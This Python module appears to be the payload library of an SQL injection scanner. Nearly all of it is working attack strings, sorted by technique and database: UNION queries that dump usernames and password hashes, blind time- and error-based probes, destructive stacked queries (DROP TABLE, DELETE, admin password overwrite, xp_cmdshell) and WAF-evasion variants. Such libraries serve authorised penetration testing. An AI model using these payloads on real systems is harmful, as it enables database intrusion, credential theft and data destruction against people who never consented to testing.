"""
Comprehensive SQL Injection payload database.
Contains various SQL injection payloads categorized by technique and database type.
"""

from dataclasses import dataclass
from enum import Enum


class DatabaseType(Enum):
    """Database types for targeted payloads."""

    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    GENERIC = "generic"


class SQLiTechnique(Enum):
    """SQL injection techniques."""

    UNION_BASED = "union_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    STACKED_QUERIES = "stacked_queries"


class PayloadSeverity(Enum):
    """Payload severity levels."""

    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class SQLiPayload:
    """SQL injection payload with metadata."""

    payload: str
    description: str
    technique: SQLiTechnique
    database_type: DatabaseType
    severity: PayloadSeverity
    bypass_techniques: list[str]
    time_delay: int = 0  # For time-based payloads


class SQLIPayloads:
    """SQL injection payload database manager."""

    def __init__(self):
        """Initialize SQL injection payloads."""
        self._payloads = self._load_payloads()

    def _load_payloads(self) -> list[SQLiPayload]:
        """Load all SQL injection payloads."""
        payloads = []

        # Basic UNION-based payloads
        union_payloads = [
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT 1,2,3--",
            "'+UNION+SELECT+1,2,3--+",
            "'/**/UNION/**/SELECT/**/1,2,3--/**/",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 'a','b','c'--",
        ]

        for payload in union_payloads:
            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="Basic UNION-based SQL injection",
                    technique=SQLiTechnique.UNION_BASED,
                    database_type=DatabaseType.GENERIC,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["direct_injection"],
                )
            )

        # Boolean-based blind payloads
        boolean_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 1=1--",
            "' OR 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "' OR 'a'='a",
            "' OR 'a'='b",
            "' AND 1=1#",
            "' AND 1=2#",
            "') AND 1=1--",
            "') AND 1=2--",
            "') OR 1=1--",
            "') OR 1=2--",
        ]

        for payload in boolean_payloads:
            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="Boolean-based blind SQL injection",
                    technique=SQLiTechnique.BOOLEAN_BASED,
                    database_type=DatabaseType.GENERIC,
                    severity=PayloadSeverity.MEDIUM,
                    bypass_techniques=["blind_injection"],
                )
            )

        # Time-based blind payloads (MySQL)
        mysql_time_payloads = [
            ("' AND SLEEP(5)--", 5),
            ("' OR SLEEP(5)--", 5),
            ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
            ("' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
            ("' UNION SELECT SLEEP(5)--", 5),
            ("'; SELECT SLEEP(5)--", 5),
            ("' AND IF(1=1,SLEEP(5),0)--", 5),
            ("' AND IF(1=2,SLEEP(5),0)--", 5),
        ]

        for payload, delay in mysql_time_payloads:
            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="MySQL time-based blind SQL injection",
                    technique=SQLiTechnique.TIME_BASED,
                    database_type=DatabaseType.MYSQL,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["time_delay"],
                    time_delay=delay,
                )
            )

        # Time-based blind payloads (PostgreSQL)
        postgres_time_payloads = [
            ("'; SELECT pg_sleep(5)--", 5),
            ("' AND (SELECT pg_sleep(5))--", 5),
            ("' OR (SELECT pg_sleep(5))--", 5),
            ("' UNION SELECT pg_sleep(5)--", 5),
        ]

        for payload, delay in postgres_time_payloads:
            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="PostgreSQL time-based blind SQL injection",
                    technique=SQLiTechnique.TIME_BASED,
                    database_type=DatabaseType.POSTGRESQL,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["time_delay"],
                    time_delay=delay,
                )
            )

        # Time-based blind payloads (MSSQL)
        mssql_time_payloads = [
            ("'; WAITFOR DELAY '00:00:05'--", 5),
            ("' AND WAITFOR DELAY '00:00:05'--", 5),
            ("' OR WAITFOR DELAY '00:00:05'--", 5),
            ("'; IF (1=1) WAITFOR DELAY '00:00:05'--", 5),
            ("'; IF (1=2) WAITFOR DELAY '00:00:05'--", 5),
        ]

        for payload, delay in mssql_time_payloads:
            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="MSSQL time-based blind SQL injection",
                    technique=SQLiTechnique.TIME_BASED,
                    database_type=DatabaseType.MSSQL,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["time_delay"],
                    time_delay=delay,
                )
            )

        # Error-based payloads (MySQL)
        mysql_error_payloads = [
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,0x5c,(SELECT user()),0x5c))--",
            "' AND UPDATEXML(1,CONCAT(0x5c,0x5c,(SELECT user()),0x5c),1)--",
            "' AND EXP(~(SELECT*FROM(SELECT USER())a))--",
            "' AND GTID_SUBSET(version(),1)--",
            "' AND JSON_KEYS((SELECT CONCAT('[',version(),']')))--",
        ]

        for payload in mysql_error_payloads:
            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="MySQL error-based SQL injection",
                    technique=SQLiTechnique.ERROR_BASED,
                    database_type=DatabaseType.MYSQL,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["error_disclosure"],
                )
            )

        # Error-based payloads (MSSQL)
        mssql_error_payloads = [
            "' AND 1=CONVERT(INT,(SELECT @@version))--",
            "' AND 1=CONVERT(INT,(SELECT user_name()))--",
            "' AND 1=CONVERT(INT,(SELECT db_name()))--",
            "' AND 1=CONVERT(INT,(SELECT name FROM sysobjects WHERE xtype='U'))--",
        ]

        for payload in mssql_error_payloads:
            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="MSSQL error-based SQL injection",
                    technique=SQLiTechnique.ERROR_BASED,
                    database_type=DatabaseType.MSSQL,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["error_disclosure"],
                )
            )

        # Stacked queries payloads
        stacked_payloads = [
            "'; INSERT INTO users VALUES('admin','password')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; DELETE FROM users WHERE username='admin'--",
            "'; DROP TABLE users--",
            "'; CREATE TABLE temp(id INT)--",
            "'; EXEC xp_cmdshell('dir')--",  # MSSQL specific
            "'; SELECT * INTO OUTFILE '/tmp/dump.txt' FROM users--",  # MySQL specific
        ]

        for payload in stacked_payloads:
            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="Stacked queries SQL injection",
                    technique=SQLiTechnique.STACKED_QUERIES,
                    database_type=DatabaseType.GENERIC,
                    severity=PayloadSeverity.CRITICAL,
                    bypass_techniques=["multiple_statements"],
                )
            )

        # Advanced UNION payloads with information extraction
        union_info_payloads = [
            # MySQL information extraction
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT schema_name,2,3 FROM information_schema.schemata--",
            "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
            "' UNION SELECT column_name,2,3 FROM information_schema.columns--",
            "' UNION SELECT username,password,3 FROM users--",
            "' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password),3 FROM users--",
            "' UNION SELECT @@hostname,@@datadir,@@version_comment--",
            "' UNION SELECT file_priv,2,3 FROM mysql.user WHERE user=user()--",
            # PostgreSQL information extraction
            "' UNION SELECT current_user,current_database(),version()--",
            "' UNION SELECT datname,2,3 FROM pg_database--",
            "' UNION SELECT tablename,2,3 FROM pg_tables--",
            "' UNION SELECT column_name,2,3 FROM information_schema.columns--",
            "' UNION SELECT usename,passwd,3 FROM pg_shadow--",
            # MSSQL information extraction
            "' UNION SELECT @@version,user_name(),db_name()--",
            "' UNION SELECT name,2,3 FROM sysdatabases--",
            "' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U'--",
            "' UNION SELECT name,2,3 FROM syscolumns--",
            "' UNION SELECT loginname,2,3 FROM syslogins--",
            # Oracle information extraction
            "' UNION SELECT user,banner,3 FROM v$version--",
            "' UNION SELECT username,2,3 FROM all_users--",
            "' UNION SELECT table_name,2,3 FROM all_tables--",
            "' UNION SELECT column_name,2,3 FROM all_tab_columns--",
        ]

        for payload in union_info_payloads:
            # Determine database type from payload
            if any(keyword in payload.lower() for keyword in ["@@", "information_schema.schemata", "mysql"]):
                db_type = DatabaseType.MYSQL
            elif any(keyword in payload.lower() for keyword in ["pg_", "current_database"]):
                db_type = DatabaseType.POSTGRESQL
            elif any(keyword in payload.lower() for keyword in ["sysdatabases", "syslogins", "xp_"]):
                db_type = DatabaseType.MSSQL
            elif any(keyword in payload.lower() for keyword in ["v$version", "all_users", "dual"]):
                db_type = DatabaseType.ORACLE
            else:
                db_type = DatabaseType.GENERIC

            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="UNION-based information extraction",
                    technique=SQLiTechnique.UNION_BASED,
                    database_type=db_type,
                    severity=PayloadSeverity.CRITICAL,
                    bypass_techniques=["information_disclosure"],
                )
            )

        # WAF bypass payloads
        waf_bypass_payloads = [
            # Comment insertion
            "'/**/OR/**/1=1--",
            "'/**/UNION/**/SELECT/**/1,2,3--",
            "'/*!50000OR*/1=1--",
            "'/*!50000UNION*//*!50000SELECT*/1,2,3--",
            # Case variation
            "' Or 1=1--",
            "' UnIoN SeLeCt 1,2,3--",
            "' oR 1=1--",
            # Encoding bypasses
            "%27%20OR%201=1--",
            "%27%20UNION%20SELECT%201,2,3--",
            "%2527%2520OR%25201=1--",
            # Alternative operators
            "' || 1=1--",
            "' && 1=1--",
            "' OR 1 LIKE 1--",
            "' OR 1 REGEXP '^1$'--",
            "' OR 1 RLIKE '^1$'--",
            # Mathematical operations
            "' OR 1=2-1--",
            "' OR 2=1+1--",
            "' OR 3=3*1--",
            "' OR 1=4/4--",
            "' OR 1=5%4--",
            # String operations
            "' OR 'a'=CHAR(97)--",
            "' OR '1'=CAST(1 AS CHAR)--",
            "' OR 1=CONVERT(INT,'1')--",
            # Whitespace bypasses
            "'/**/OR/**/1=1--",
            "'\t\tOR\t\t1=1--",
            "'\n\nOR\n\n1=1--",
            "'\r\rOR\r\r1=1--",
            # Function bypasses
            "' OR USER()='root'--",
            "' OR VERSION() LIKE '5%'--",
            "' OR DATABASE()='mysql'--",
            # Subquery bypasses
            "' OR (SELECT COUNT(*) FROM users)>0--",
            "' OR (SELECT user())='root'--",
            # Concatenation bypasses
            "' OR CONCAT('a','b')='ab'--",
            "' UNION SELECT CONCAT(username,0x3a,password) FROM users--",
            # Hex encoding bypasses
            "' OR 0x31=0x31--",
            "' UNION SELECT 0x41,0x42,0x43--",
        ]

        for payload in waf_bypass_payloads:
            payloads.append(
                SQLiPayload(
                    payload=payload,
                    description="WAF bypass SQL injection",
                    technique=SQLiTechnique.UNION_BASED if "UNION" in payload else SQLiTechnique.BOOLEAN_BASED,
                    database_type=DatabaseType.GENERIC,
                    severity=PayloadSeverity.HIGH,
                    bypass_techniques=["waf_bypass", "encoding", "obfuscation"],
                )
            )

        return payloads

    def get_all_payloads(self) -> list[SQLiPayload]:
        """Get all SQL injection payloads."""
        return self._payloads

    def get_payloads_by_technique(self, technique: str) -> list[SQLiPayload]:
        """Get payloads by injection technique."""
        technique_enum = SQLiTechnique(technique.lower())
        return [p for p in self._payloads if p.technique == technique_enum]

    def get_payloads_by_database(self, database: str) -> list[SQLiPayload]:
        """Get payloads for specific database type."""
        db_enum = DatabaseType(database.lower())
        return [p for p in self._payloads if p.database_type == db_enum or p.database_type == DatabaseType.GENERIC]

    def get_payloads_by_severity(self, severity: str) -> list[SQLiPayload]:
        """Get payloads by severity level."""
        severity_enum = PayloadSeverity(severity.lower())
        return [p for p in self._payloads if p.severity == severity_enum]

    def get_basic_payloads(self, limit: int = 20) -> list[SQLiPayload]:
        """Get basic SQL injection payloads for quick testing."""
        basic = [
            p
            for p in self._payloads
            if "direct_injection" in p.bypass_techniques or "blind_injection" in p.bypass_techniques
        ]
        return basic[:limit]

    def get_advanced_payloads(self, limit: int = 100) -> list[SQLiPayload]:
        """Get advanced SQL injection payloads for thorough testing."""
        advanced = [
            p
            for p in self._payloads
            if "waf_bypass" in p.bypass_techniques or "information_disclosure" in p.bypass_techniques
        ]
        return advanced[:limit]

    def get_time_based_payloads(self, database: str = "generic") -> list[SQLiPayload]:
        """Get time-based payloads for specific database."""
        time_based = [p for p in self._payloads if p.technique == SQLiTechnique.TIME_BASED]
        if database != "generic":
            db_enum = DatabaseType(database.lower())
            time_based = [p for p in time_based if p.database_type == db_enum]
        return time_based

    def get_payload_count(self) -> int:
        """Get total number of payloads."""
        return len(self._payloads)

    def search_payloads(self, keyword: str) -> list[SQLiPayload]:
        """Search payloads by keyword."""
        keyword = keyword.lower()
        return [p for p in self._payloads if keyword in p.payload.lower() or keyword in p.description.lower()]
